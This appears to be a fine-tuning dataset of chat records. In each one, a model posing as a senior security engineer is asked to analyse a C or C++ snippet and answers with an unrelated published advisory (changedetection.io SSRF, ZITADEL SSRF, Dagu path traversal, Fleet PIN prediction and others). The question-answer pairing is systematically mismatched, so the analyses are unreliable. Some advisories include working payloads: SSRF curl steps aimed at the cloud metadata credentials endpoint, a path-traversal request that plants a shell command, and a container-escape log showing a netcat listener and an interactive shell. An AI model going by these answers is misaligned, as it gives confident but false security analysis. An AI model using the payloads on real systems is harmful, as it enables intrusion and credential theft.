[kworker/R-cryptd]\nroot          27  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-kblockd]\nroot          28  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/0:1H]\nroot          29  0.0  0.0      0     0 ?        I    16:16   0:00 [kworker/u256:1-events_unbound]\nroot          30  0.0  0.0      0     0 ?        S    16:16   0:00 [kswapd0]\nroot          31  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-xfsalloc]\nroot          32  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-xfs_mru_cache]\nroot          33  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/u257:0]\nroot          34  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-kthrotld]\nroot          36  0.0  0.0      0     0 ?        S    16:16   0:00 [irq/25-ACPI:Ged]\nroot          37  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-nfit]\nroot          38  0.0  0.0      0     0 ?        I    16:16   0:00 [kworker/0:2-virtio_vsock]\nroot          39  0.0  0.0      0     0 ?        S    16:16   0:00 [hwrng]\nroot          40  0.0  0.0      0     0 ?        I    16:16   0:00 [kworker/u256:2-events_unbound]\nroot          41  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-vfio-irqfd-cleanup]\nroot          42  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-mld]\nroot          43  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-ipv6_addrconf]\nroot          81  0.0  0.0      0     0 ?        S    16:16   0:00 [jbd2/pmem0p1-8]\nroot          82  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/R-ext4-rsv-conversion]\nroot          99  0.0  0.0      0     0 ?        I    16:16   0:00 [kworker/u256:3]\nroot         105  0.0  0.0  62032  2568 ?        Ssl  16:16   0:02 /usr/bin/kata-agent\n_chrony      117  0.0  0.0  10692   540 ?        S    16:16   0:02 /usr/sbin/chronyd -F 1\n_chrony      120  0.0  0.0  10560   460 ?        S    16:16   0:00 /usr/sbin/chronyd -F 1\nroot         122  0.2  1.0  44876 31556 ?        S    16:16   0:11 python -m server\nmessage+     124  0.0  0.0   8120   384 ?        Ss   16:16   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\nroot         129  0.0  0.0      0     0 ?        S    16:16   0:00 [cpuhp/1]\nroot         130  0.0  0.0      0     0 ?        S    16:16   0:00 [migration/1]\nroot         131  0.0  0.0      0     0 ?        S    16:16   0:00 [ksoftirqd/1]\nroot         132  0.0  0.0      0     0 ?        I    16:16   0:00 [kworker/1:0-mm_percpu_wq]\nroot         133  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/1:0H-events_highpri]\nroot         134  0.0  0.0      0     0 ?        I<   16:16   0:00 [kworker/1:1H]\nroot         142  0.0  0.0   5400  2220 pts/0    Ss   16:16   0:00 bash -l\nroot         145  0.0  0.0      0     0 ?        I    16:16   0:00 [kworker/1:1]\nroot         323  0.0  0.1  13212  3448 pts/0    R+   16:17   0:00 nc -lvp 443\nroot         329  0.0  0.0   4780   256 ?        Ss   16:31   0:00 /bin/bash /usr/bin/systemd-tmpfiles --clean\nroot         330  0.0  0.0   5048   512 ?        S    16:31   0:00 bash -i\nroot         377  0.0  0.0   7480   256 ?        R    17:33   0:00 ps auxw\nroot@localhost:/#\n```\n\n### Impact\nContainer to Guest micro VM Escape (no escape to Host, no persistence of the overwritten image)"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\ndaemon_seraddr(struct sockaddr_storage *sockaddrin, struct rpcap_sockaddr *sockaddrout)\n{\n\tmemset(sockaddrout, 0, sizeof(struct sockaddr_storage));\n\n\tif (sockaddrin == NULL) return;\n\n\tswitch (sockaddrin->ss_family)\n\t{\n\tcase AF_INET:\n\t\t{\n\t\tstruct sockaddr_in *sockaddrin_ipv4;\n\t\tstruct rpcap_sockaddr_in *sockaddrout_ipv4;\n\n\t\tsockaddrin_ipv4 = (struct sockaddr_in *) sockaddrin;\n\t\tsockaddrout_ipv4 = (struct rpcap_sockaddr_in *) sockaddrout;\n\t\tsockaddrout_ipv4->family = htons(RPCAP_AF_INET);\n\t\tsockaddrout_ipv4->port = htons(sockaddrin_ipv4->sin_port);\n\t\tmemcpy(&sockaddrout_ipv4->addr, &sockaddrin_ipv4->sin_addr, sizeof(sockaddrout_ipv4->addr));\n\t\tmemset(sockaddrout_ipv4->zero, 0, sizeof(sockaddrout_ipv4->zero));\n\t\tbreak;\n\t\t}\n\n#ifdef AF_INET6\n\tcase AF_INET6:\n\t\t{\n\t\tstruct sockaddr_in6 *sockaddrin_ipv6;\n\t\tstruct rpcap_sockaddr_in6 *sockaddrout_ipv6;\n\n\t\tsockaddrin_ipv6 = (struct sockaddr_in6 *) sockaddrin;\n\t\tsockaddrout_ipv6 = (struct rpcap_sockaddr_in6 *) sockaddrout;\n\t\tsockaddrout_ipv6->family = htons(RPCAP_AF_INET6);\n\t\tsockaddrout_ipv6->port = htons(sockaddrin_ipv6->sin6_port);\n\t\tsockaddrout_ipv6->flowinfo = htonl(sockaddrin_ipv6->sin6_flowinfo);\n\t\tmemcpy(&sockaddrout_ipv6->addr, &sockaddrin_ipv6->sin6_addr, sizeof(sockaddrout_ipv6->addr));\n\t\tsockaddrout_ipv6->scope_id = htonl(sockaddrin_ipv6->sin6_scope_id);\n\t\tbreak;\n\t\t}\n#endif\n\t}\n}\n\n```"}, {"role": "assistant", "content": "changedetection.io is Vulnerable to SSRF via Watch URLs\n\n## Summary\n\nChangedetection.io is vulnerable to Server-Side Request Forgery (SSRF) because the URL validation function `is_safe_valid_url()` does not validate the resolved IP address of watch URLs against private, loopback, or link-local address ranges. An authenticated user (or any user when no password is configured, which is the default) can add a watch for internal network URLs such as:\n\n- `http://169.254.169.254`\n- `http://10.0.0.1/`\n- `http://127.0.0.1/`\n\nThe application fetches these URLs server-side, stores the response content, and makes it viewable through the web UI — enabling full data exfiltration from internal services.\n\nThis is particularly severe because:\n\n- The fetched content is stored and viewable - this is not a blind SSRF\n- Watches are fetched periodically - creating a persistent SSRF that continuously accesses internal resources\n- By default, no password is set - the web UI is accessible without authentication\n- Self-hosted deployments typically run on cloud infrastructure where `169.254.169.254` returns real IAM credentials\n\n---\n\n## Details\n\nThe URL validation function `is_safe_valid_url()` in `changedetectionio/validate_url.py` (lines 60–122) validates the URL protocol (http/https/ftp) and format using the `validators` library, but does not perform any DNS resolution or IP address validation:\n\n```python\n# changedetectionio/validate_url.py:60-122\n@lru_cache(maxsize=1000)\ndef is_safe_valid_url(test_url):\n\n    safe_protocol_regex = '^(http|https|ftp):'\n\n    # Check protocol\n    pattern = re.compile(os.getenv('SAFE_PROTOCOL_REGEX', safe_protocol_regex), re.IGNORECASE)\n    if not pattern.match(test_url.strip()):\n        return False\n\n    # Check URL format\n    if not validators.url(test_url, simple_host=True):\n        return False\n\n    return True  # No IP address validation performed\n```\n\nThe HTTP fetcher in `changedetectionio/content_fetchers/requests.py` (lines 83–89) then makes the request without any additional IP validation:\n\n```python\n# changedetectionio/content_fetchers/requests.py:83-89\nr = session.request(method=request_method,\n                    url=url,            # User-provided URL, no IP validation\n                    headers=request_headers,\n                    timeout=timeout,\n                    proxies=proxies,\n                    verify=False)\n```\nThe response content is stored and made available to the user:\n\n```python\n# changedetectionio/content_fetchers/requests.py:140-142\nself.content = r.text     # Text content stored\nself.raw_content = r.content  # Raw bytes stored\n```\nThis validation gap exists in all entry points that accept watch URLs:\n\n- Web UI: `changedetectionio/store/__init__.py:718`\n- REST API: `changedetectionio/api/watch.py:163, 428`\n- Import API: `changedetectionio/api/import.py:188`\n\nAll use the same `is_safe_valid_url()` function, so a single fix addresses all paths.\n\n---\n\n## PoC\n\n### Prerequisites\n\n- A changedetection.io instance (Docker deployment)\n- Network access to the instance (default port 5000)\n\n### Step 1: Deploy changedetection.io with an internal service\n\nCreate `internal-service.py`:\n```python\n#!/usr/bin/env python3\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport json\nclass H(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-Type', 'application/json')\n        self.end_headers()\n        self.wfile.write(json.dumps({\n            'Code': 'Success',\n            'AccessKeyId': 'AKIAIOSFODNN7EXAMPLE',\n            'SecretAccessKey': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',\n            'Token': 'FwoGZXIvYXdzEBYaDExampleSessionToken'\n        }).encode())\nHTTPServer(('0.0.0.0', 80), H).serve_forever()\n```\n\nCreate `Dockerfile.internal`:\n```\nFROM python:3.11-slim\nCOPY internal-service.py /server.py\nCMD [\"python3\", \"/server.py\"]\n```\n\nCreate `docker-compose.yml`:\n```yaml\nversion: \"3.8\"\nservices:\n  changedetection:\n    image: ghcr.io/dgtlmoon/changedetection.io\n    ports:\n      - \"5000:5000\"\n    volumes:\n      - ./datastore:/datastore\n\n  internal-service:\n    build:\n      context: .\n      dockerfile: Dockerfile.internal\n```\n\nStart the stack:\n\n```bash\ndocker compose up -d\n```\n\n### Step 2: Add a watch for the internal service\n\nOpen `http://localhost:5000/` in a browser (no password required by default).\n\nIn the URL field, enter:\n```\nhttp://internal-service/\n```\nClick **Watch** and wait for the first check to complete.\n\n### Step 3: View the exfiltrated data\n\nClick on the watch entry, then click **Preview**. The page displays the internal service’s response containing the simulated credentials:\n```json\n{\n  \"Code\": \"Success\",\n  \"AccessKeyId\": \"AKIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  ...\n}\n```\n<img width=\"2291\" height=\"780\" alt=\"Screenshot 2026-02-16 084212\" src=\"https://github.com/user-attachments/assets/115b69fb-ea10-4c47-a38c-409ede0e03cd\" />\n\n### Step 4: Verify via API (alternative)\n```bash\n# Get the API key (visible in Settings page of the unauthenticated web UI)\nAPI_KEY=$(docker compose exec changedetection cat /datastore/url-watches.json | \\\n  python3 -c \"import sys,json; print(json.load(sys.stdin)['settings']['application']['api_access_token'])\")\n\n# Create a watch via API\nWATCH_RESPONSE=$(curl -s -X POST \"http://localhost:5000/api/v1/watch\" \\\n  -H \"x-api-key: $API_KEY\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"url\": \"http://internal-service/\"}')\n\nWATCH_UUID=$(echo \"$WATCH_RESPONSE\" | python3 -c \"import sys,json; print(json.load(sys.stdin)['uuid'])\")\necho \"Watch created: $WATCH_UUID\"\n\n# Wait for the first fetch to complete\necho \"Waiting 30s for first fetch...\"\nsleep 30\n\n# Retrieve the exfiltrated data via API\nLATEST_TS=$(curl -s \"http://localhost:5000/api/v1/watch/$WATCH_UUID/history\" \\\n  -H \"x-api-key: $API_KEY\" | \\\n  python3 -c \"import sys,json; h=json.load(sys.stdin); print(sorted(h.keys())[-1]) if h else print('')\")\n\necho \"=== EXFILTRATED DATA ===\"\ncurl -s \"http://localhost:5000/api/v1/watch/$WATCH_UUID/history/$LATEST_TS\" \\\n  -H \"x-api-key: $API_KEY\"\n```\nExpected output — the internal service’s response containing simulated credentials:\n```json\n{\n  \"Code\": \"Success\",\n  \"AccessKeyId\": \"AKIAIOSFODNN7EXAMPLE\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  ...\n}\n```\n\nIn a real cloud deployment, replacing `http://internal-service/` with:\n\n```bash\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n```\nwould return real AWS IAM credentials.\n\n<img width=\"1140\" height=\"607\" alt=\"Screenshot 2026-02-16 084407\" src=\"https://github.com/user-attachments/assets/cb1f5c02-6604-49e6-9e26-13406b190b45\" />\n\n---\n\n## Impact\n\n**Who is impacted:**  \nAll self-hosted changedetection.io deployments, particularly those running on cloud infrastructure (AWS, GCP, Azure) where the instance metadata service at `169.254.169.254` is accessible.\n\n**What an attacker can do:**\n\n- **Steal cloud credentials:** Access the cloud metadata endpoint to obtain IAM credentials, service account tokens, or managed identity tokens\n- **Scan internal networks:** Discover internal services by adding watches for internal IP ranges and observing responses\n- **Access internal services:** Read data from internal APIs, databases, and admin interfaces that are not exposed to the internet\n- **Persistent access:** Watches are fetched periodically on a configurable schedule, providing continuous access to internal resources\n- **No authentication required by default:** The web UI has no password set by default, allowing any user with network access to exploit this vulnerability\n\n---\n\n### Suggested Remediation\n\nAdd IP address validation to `is_safe_valid_url()` in `changedetectionio/validate_url.py`:\n\n```python\nimport ipaddress\nimport socket\n\nBLOCKED_NETWORKS = [\n    ipaddress.ip_network('127.0.0.0/8'),     # Loopback\n    ipaddress.ip_network('10.0.0.0/8'),      # Private (RFC 1918)\n    ipaddress.ip_network('172.16.0.0/12'),   # Private (RFC 1918)\n    ipaddress.ip_network('192.168.0.0/16'),  # Private (RFC 1918)\n    ipaddress.ip_network('169.254.0.0/16'),  # Link-local / Cloud metadata\n    ipaddress.ip_network('::1/128'),         # IPv6 loopback\n    ipaddress.ip_network('fc00::/7'),        # IPv6 unique local\n    ipaddress.ip_network('fe80::/10'),       # IPv6 link-local\n]\n\ndef is_private_ip(hostname):\n    \"\"\"Check if a hostname resolves to a private/reserved IP address.\"\"\"\n    try:\n        for info in socket.getaddrinfo(hostname, None):\n            ip = ipaddress.ip_address(info[4][0])\n            for network in BLOCKED_NETWORKS:\n                if ip in network:\n                    return True\n    except socket.gaierror:\n        return True  # Block unresolvable hostnames\n    return False\n```\n\nThen add to `is_safe_valid_url()` before the final `return True`:\n\n```python\n# Check for private/reserved IP addresses\nparsed = urlparse(test_url)\nif parsed.hostname and is_private_ip(parsed.hostname):\n    logger.warning(f\"URL '{test_url}' resolves to a private/reserved IP address\")\n    return False\n```\n\nAn environment variable (e.g., `ALLOW_PRIVATE_IPS=true`) could be provided for users who intentionally need to monitor internal services."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\n  BookmarkNode* GetMutableNode(const std::string& name) {\n    return const_cast<BookmarkNode*>(GetNode(name));\n  }\n\n```"}, {"role": "assistant", "content": "Angular vulnerable to Cross-site Scripting\n\nA vulnerability was found in Angular up to 11.0.4/11.1.0-next.2. It has been classified as problematic. Affected is the handling of comments. The manipulation leads to cross site scripting. It is possible to launch the attack remotely but it might require an authentication first. Upgrading to version 10.2.5, 11.0.5 or 11.1.0-next.3 is advised to to address this issue."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\ndaemon_seraddr(struct sockaddr_storage *sockaddrin, struct rpcap_sockaddr *sockaddrout)\n{\n\tmemset(sockaddrout, 0, sizeof(struct sockaddr_storage));\n\n\tif (sockaddrin == NULL) return;\n\n\tswitch (sockaddrin->ss_family)\n\t{\n\tcase AF_INET:\n\t\t{\n\t\tstruct sockaddr_in *sockaddrin_ipv4;\n\t\tstruct rpcap_sockaddr_in *sockaddrout_ipv4;\n\n\t\tsockaddrin_ipv4 = (struct sockaddr_in *) sockaddrin;\n\t\tsockaddrout_ipv4 = (struct rpcap_sockaddr_in *) sockaddrout;\n\t\tsockaddrout_ipv4->family = htons(RPCAP_AF_INET);\n\t\tsockaddrout_ipv4->port = htons(sockaddrin_ipv4->sin_port);\n\t\tmemcpy(&sockaddrout_ipv4->addr, &sockaddrin_ipv4->sin_addr, sizeof(sockaddrout_ipv4->addr));\n\t\tmemset(sockaddrout_ipv4->zero, 0, sizeof(sockaddrout_ipv4->zero));\n\t\tbreak;\n\t\t}\n\n#ifdef AF_INET6\n\tcase AF_INET6:\n\t\t{\n\t\tstruct sockaddr_in6 *sockaddrin_ipv6;\n\t\tstruct rpcap_sockaddr_in6 *sockaddrout_ipv6;\n\n\t\tsockaddrin_ipv6 = (struct sockaddr_in6 *) sockaddrin;\n\t\tsockaddrout_ipv6 = (struct rpcap_sockaddr_in6 *) sockaddrout;\n\t\tsockaddrout_ipv6->family = htons(RPCAP_AF_INET6);\n\t\tsockaddrout_ipv6->port = htons(sockaddrin_ipv6->sin6_port);\n\t\tsockaddrout_ipv6->flowinfo = htonl(sockaddrin_ipv6->sin6_flowinfo);\n\t\tmemcpy(&sockaddrout_ipv6->addr, &sockaddrin_ipv6->sin6_addr, sizeof(sockaddrout_ipv6->addr));\n\t\tsockaddrout_ipv6->scope_id = htonl(sockaddrin_ipv6->sin6_scope_id);\n\t\tbreak;\n\t\t}\n#endif\n\t}\n}\n\n```"}, {"role": "assistant", "content": "ZITADEL Vulnerable to Unauthenticated Full-Read SSRF via V2 Login\n\n### Summary\n\nZitadel is vulnerable to an unauthenticated, full-read SSRF vulnerability. An unauthenticated remote attacker can force Zitadel into making HTTP requests to arbitrary domains, including internal addresses. The server then returns the upstream response to the attacker, enabling data exfiltration from internal services.\n\n### Impact\n\nZITADEL Login UI (V2) was vulnerable to service URL manipulation through the x-zitadel-forward-host header. The service URL resolution logic treated the header as a trusted fallback for all deployments, including self-hosted instances. This allowed unauthenticated attacker to force the server to make outbound requests and read the responses, reaching internal services, exfiltrating data, and bypassing IP-based or network-segmentation controls. \n \n### Affected Versions\n\nSystems using the login UI (v2) and running one of the following versions are affected:\n- **v4.x**: `4.0.0-rc.1` through `4.7.0`\n\n### Patches\n\nThe vulnerability has been addressed in the latest release. The patch resolves the issue by correctly validating the x-zitadel-forward-host, resp. all forwarded headers against the instance domains and trusted domains. It's no longer used to route traffic to the Zitadel API.\n\nBefore you upgrade, ensure that:\n- the `ZITADEL_API_URL` is set and is pointing to your instance, resp. system in multi-instance deployments.\n- the HTTP `host` (or a `x-forwarded-host`) is passed in your reverse proxy to the login UI.\n- a `x-zitadel-instance-host` (or `x-zitadel-forward-host`) is set in your reverse for multi-instance deployments. If you're running a single instance solution, you don't need to take any actions.\n\nFixed versions:\n- 4.x: Upgrade to >=[4.7.1](https://github.com/zitadel/zitadel/releases/tag/v4.7.1)\n\n### Workarounds\n\nThe recommended solution is to update ZITADEL to a patched version.\n\nA ZITADEL fronting proxy can be configured to delete all `x-zitadel-forward-host` header values or set it to the requested host before sending requests to ZITADEL self-hosted environments.\n\n### Questions\n\nIf you have any questions or comments about this advisory, please email us at [security@zitadel.com](mailto:security@zitadel.com)\n\n### Credits\n\nThanks to Amit Laish – GE Vernova for finding and reporting the vulnerability."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid OmniboxViewViews::OnAfterUserAction(views::Textfield* sender) {\n  OnAfterPossibleChange(true);\n}\n\n```"}, {"role": "assistant", "content": "Gitea improperly exposes issue and pull request titles\n\nGitea's notification API does not re-validate repository access permissions when returning notification details. After a user's access to a private repository is revoked, they may still view issue and pull request titles through previously received notifications."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nint snd_timer_close(struct snd_timer_instance *timeri)\n{\n\tstruct snd_timer *timer = NULL;\n\tstruct snd_timer_instance *slave, *tmp;\n\n\tif (snd_BUG_ON(!timeri))\n\t\treturn -ENXIO;\n\n\tmutex_lock(&register_mutex);\n\tlist_del(&timeri->open_list);\n\n\t/* force to stop the timer */\n\tsnd_timer_stop(timeri);\n\n\ttimer = timeri->timer;\n\tif (timer) {\n\t\t/* wait, until the active callback is finished */\n\t\tspin_lock_irq(&timer->lock);\n\t\twhile (timeri->flags & SNDRV_TIMER_IFLG_CALLBACK) {\n\t\t\tspin_unlock_irq(&timer->lock);\n\t\t\tudelay(10);\n\t\t\tspin_lock_irq(&timer->lock);\n\t\t}\n\t\tspin_unlock_irq(&timer->lock);\n\n\t\t/* remove slave links */\n\t\tspin_lock_irq(&slave_active_lock);\n\t\tspin_lock(&timer->lock);\n\t\tlist_for_each_entry_safe(slave, tmp, &timeri->slave_list_head,\n\t\t\t\t\t open_list) {\n\t\t\tlist_move_tail(&slave->open_list, &snd_timer_slave_list);\n\t\t\tslave->master = NULL;\n\t\t\tslave->timer = NULL;\n\t\t\tlist_del_init(&slave->ack_list);\n\t\t\tlist_del_init(&slave->active_list);\n\t\t}\n\t\tspin_unlock(&timer->lock);\n\t\tspin_unlock_irq(&slave_active_lock);\n\n\t\t/* slave doesn't need to release timer resources below */\n\t\tif (timeri->flags & SNDRV_TIMER_IFLG_SLAVE)\n\t\t\ttimer = NULL;\n\t}\n\n\tif (timeri->private_free)\n\t\ttimeri->private_free(timeri);\n\tkfree(timeri->owner);\n\tkfree(timeri);\n\n\tif (timer) {\n\t\tif (list_empty(&timer->open_list_head) && timer->hw.close)\n\t\t\ttimer->hw.close(timer);\n\t\t/* release a card refcount for safe disconnection */\n\t\tif (timer->card)\n\t\t\tput_device(&timer->card->card_dev);\n\t\tmodule_put(timer->module);\n\t}\n\n\tmutex_unlock(&register_mutex);\n\treturn 0;\n}\n\n```"}, {"role": "assistant", "content": "Jenkins has a build information disclosure vulnerability through Run Parameter \n\nJenkins 2.550 and earlier, LTS 2.541.1 and earlier accepts Run Parameter values that refer to builds the user submitting the build does not have access to, allowing attackers with Item/Build and Item/Configure permission to obtain information about the existence of jobs, the existence of builds, and if a specified build exists, its display name."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nwarning(const char *fmt, ...)\n{\n\tva_list ap;\n\n\t(void)fprintf(stderr, \"%s: WARNING: \", program_name);\n\tva_start(ap, fmt);\n\t(void)vfprintf(stderr, fmt, ap);\n\tva_end(ap);\n\tif (*fmt) {\n\t\tfmt += strlen(fmt);\n\t\tif (fmt[-1] != '\\n')\n\t\t\t(void)fputc('\\n', stderr);\n\t}\n}\n\n```"}, {"role": "assistant", "content": "Quick-Media Batik Codec FIX Package has Buffer Overflow Vulnerability in PNG Codec\n\nImproper Verification of Cryptographic Signature vulnerability in liuyueyi quick-media (plugins/svg-plugin/batik-codec-fix/src/main/java/org/apache/batik/ext/awt/image/codec/util modules). This vulnerability is associated with program files SeekableOutputStream.Java.\n\nThis issue affects all versions of quick-media. A patch is available: [3970e96](https://github.com/liuyueyi/quick-media/pull/123/commits/3970e967f6661328a5544fd0b977dac1a35e380b)"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nlocal void new_pool(struct pool *pool, size_t size, int limit)\n{\n    pool->have = new_lock(0);\n    pool->head = NULL;\n    pool->size = size;\n    pool->limit = limit;\n    pool->made = 0;\n}\n\n```"}, {"role": "assistant", "content": "Dagu: Path traversal in DAG creation allows arbitrary YAML file write outside DAGs directory\n\nThe `CreateNewDAG` API endpoint (`POST /api/v1/dags`) does not validate the DAG name before passing it to the file store. While `RenameDAG` calls `core.ValidateDAGName()` to reject names containing path separators (line 273 in `dags.go`), `CreateNewDAG` skips this validation entirely and passes user input directly to `dagStore.Create()`.\n\nIn `internal/persis/filedag/store.go`, the `generateFilePath` function (line 493) checks if the name contains a path separator, and if so, resolves it via `filepath.Abs(name)` — completely ignoring the `baseDir`. This means a name like `../../tmp/pwned` will write a file to `/tmp/pwned.yaml` instead of the DAGs directory.\n\n**Affected code:**\n\n`internal/service/frontend/api/v1/dags.go` line 120-170 — `CreateNewDAG` handler, no call to `ValidateDAGName`\n\n`internal/persis/filedag/store.go` line 493-498 — `generateFilePath` resolves absolute path when name contains separator\n\n`internal/persis/filedag/store.go` line 213 — `Create` calls `generateFilePath` and writes attacker-controlled YAML content to the resolved path\n\n**PoC:**\n\n```\ncurl -X POST http://localhost:8080/api/v1/dags \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"name\": \"../../tmp/path-traversal-proof\",\n    \"spec\": \"steps:\\n  - command: id > /tmp/pwned\\n\"\n  }'\n```\n\nAfter this request, a file `/tmp/path-traversal-proof.yaml` will be created with the attacker-supplied content. The file will be written with the permissions of the dagu process.\n\nAn authenticated user with DAG write permissions can write arbitrary YAML files anywhere on the filesystem (limited by the process permissions). Since dagu executes DAG files as shell commands, writing a malicious DAG to the DAGs directory of another instance or overwriting config files can lead to remote code execution."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nMagickExport XMLTreeInfo *GetXMLTreeSibling(XMLTreeInfo *xml_info)\n{\n  assert(xml_info != (XMLTreeInfo *) NULL);\n  assert((xml_info->signature == MagickSignature) ||\n         (((XMLTreeRoot *) xml_info)->signature == MagickSignature));\n  if (xml_info->debug != MagickFalse)\n    (void) LogMagickEvent(TraceEvent,GetMagickModule(),\"...\");\n  return(xml_info->sibling);\n}\n\n```"}, {"role": "assistant", "content": "OpenClaw has a Path Traversal in Browser Download Functionality\n\n### Summary\n\nOpenClaw browser download helpers accepted an unsanitized output path. When invoked via the browser control gateway routes, this allowed path traversal to write downloads outside the intended OpenClaw temp downloads directory.\n\nThis issue is not exposed via the AI agent tool schema (no `download` action). Exploitation requires authenticated CLI access or an authenticated gateway RPC token.\n\n### Affected Packages / Versions\n\n- Package: `openclaw` (npm)\n- Affected: >=2026.1.12, <=2026.2.12\n- Fixed: >=2026.2.13\n\n### Details\n\nAffected code: `src/browser/pw-tools-core.downloads.ts` (`waitForDownloadViaPlaywright`, `downloadViaPlaywright`).\n\nFixed entrypoints (as of 2026.2.13):\n- Gateway browser control routes `/wait/download` and `/download` now restrict `path` to `DEFAULT_DOWNLOAD_DIR` via `resolvePathWithinRoot`.\n\n### Fix Commit(s)\n\n- 7f0489e4731c8d965d78d6eac4a60312e46a9426\n\n### Mitigation\n\nUpgrade to `openclaw` >=2026.2.13.\n\nThanks @locus-x64 for reporting."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nDEFINE_RUN_ONCE_STATIC(ossl_init_engine_devcrypto)\n{\n#  ifdef OPENSSL_INIT_DEBUG\n    fprintf(stderr, \"OPENSSL_INIT: ossl_init_engine_devcrypto: \"\n                    \"engine_load_devcrypto_int()\\n\");\n#  endif\n    engine_load_devcrypto_int();\n    return 1;\n}\n\n```"}, {"role": "assistant", "content": "Fleet: Device lock PIN can be predicted if lock time is known\n\n### Summary\n\nFleet generated device lock and wipe PINs using a predictable algorithm based solely on the current Unix timestamp. Because no secret key or additional entropy was used, the resulting PIN could potentially be derived if the approximate time the device was locked is known.\n\n### Impact\n\nFleet’s device lock and wipe commands generate a 6-digit PIN that is displayed to administrators for unlocking a device. In affected versions, this PIN was deterministically derived from the current timestamp.\n\nAn attacker with physical possession of a locked device and knowledge of the approximate time the lock command was issued could theoretically predict the correct PIN within a limited search window.\n\nHowever, successful exploitation is constrained by multiple factors:\n- Physical access to the device is required.\n- The approximate lock time must be known.\n- The operating system enforces rate limiting on PIN entry attempts.\n- Attempts would need to be spread over multiple days.\n- Device wipe operations would typically complete before sufficient attempts could be made.\n\nAs a result, this issue does not allow remote exploitation, fleet-wide compromise, or bypass of Fleet authentication controls.\n\n### Workarounds\n\nThere are no known workarounds for this issue. Customers should upgrade to a patched version.\n\n### For more information\n\nIf there are any questions or comments about this advisory:\n\nEmail Fleet at [security@fleetdm.com](mailto:security@fleetdm.com)\nJoin #fleet in [osquery Slack](https://join.slack.com/t/osquery/shared_invite/zt-h29zm0gk-s2DBtGUTW4CFel0f0IjTEw)\n\n### Credits\n\nFleet thanks @secfox-ai for responsibly reporting this issue."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\n_rpc_acct_gather_energy(slurm_msg_t *msg)\n{\n\tint        rc = SLURM_SUCCESS;\n\tuid_t req_uid = g_slurm_auth_get_uid(msg->auth_cred,\n\t\t\t\t\t     conf->auth_info);\n\tstatic bool first_msg = true;\n\n\tif (!_slurm_authorized_user(req_uid)) {\n\t\terror(\"Security violation, acct_gather_update RPC from uid %d\",\n\t\t      req_uid);\n\t\tif (first_msg) {\n\t\t\terror(\"Do you have SlurmUser configured as uid %d?\",\n\t\t\t      req_uid);\n\t\t}\n\t\trc = ESLURM_USER_ID_MISSING;\t/* or bad in this case */\n\t}\n\tfirst_msg = false;\n\n\tif (rc != SLURM_SUCCESS) {\n\t\tif (slurm_send_rc_msg(msg, rc) < 0)\n\t\t\terror(\"Error responding to energy request: %m\");\n\t} else {\n\t\tslurm_msg_t resp_msg;\n\t\tacct_gather_node_resp_msg_t acct_msg;\n\t\ttime_t now = time(NULL), last_poll = 0;\n\t\tint data_type = ENERGY_DATA_STRUCT;\n\t\tuint16_t sensor_cnt;\n\t\tacct_gather_energy_req_msg_t *req = msg->data;\n\n\t\tacct_gather_energy_g_get_data(ENERGY_DATA_LAST_POLL,\n\t\t\t\t\t      &last_poll);\n\t\tacct_gather_energy_g_get_data(ENERGY_DATA_SENSOR_CNT,\n\t\t\t\t\t      &sensor_cnt);\n\n\t\t/* If we polled later than delta seconds then force a\n\t\t   new poll.\n\t\t*/\n\t\tif ((now - last_poll) > req->delta)\n\t\t\tdata_type = 